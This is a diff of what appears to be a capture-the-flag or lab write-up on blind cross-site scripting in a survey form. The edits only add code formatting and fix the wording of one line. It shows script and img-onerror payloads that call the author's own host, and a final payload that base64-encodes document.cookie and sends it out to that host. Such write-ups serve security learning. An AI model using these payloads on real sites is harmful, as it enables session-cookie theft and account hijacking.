@@ -40,8 +40,8 @@ focusing on xss, we can put some test payloads in every field to see if we can g
 
 we cannot see our surveys after sending them, making this a blind xss- make a request to a webserver you control to leak data:
 
-<script>fetch("http://my_ip:8111/xss")</script>
-<img src=x onerror=fetch("http://my_ip:8111/xss")>
+`<script>fetch("http://my_ip:8111/xss")</script>`
+`<img src=x onerror=fetch("http://my_ip:8111/xss")>`
 
 and we indeed get some requests back!!
 
@@ -51,6 +51,6 @@ seems like the basic script tag worked, now we just construct a payload to leak 
 
 `<script>fetch("http://my_ip:8111/?xss="%2bbtoa(document.cookie))</script>`
 
-ideally run a php server or something that decodes that from the param and logs it but im lazy and just gonna used the python webserver and decode manually
+ideally run a php server or something that decodes that from the param and logs it but im lazy and just used the python webserver logs and decode manually
 
 
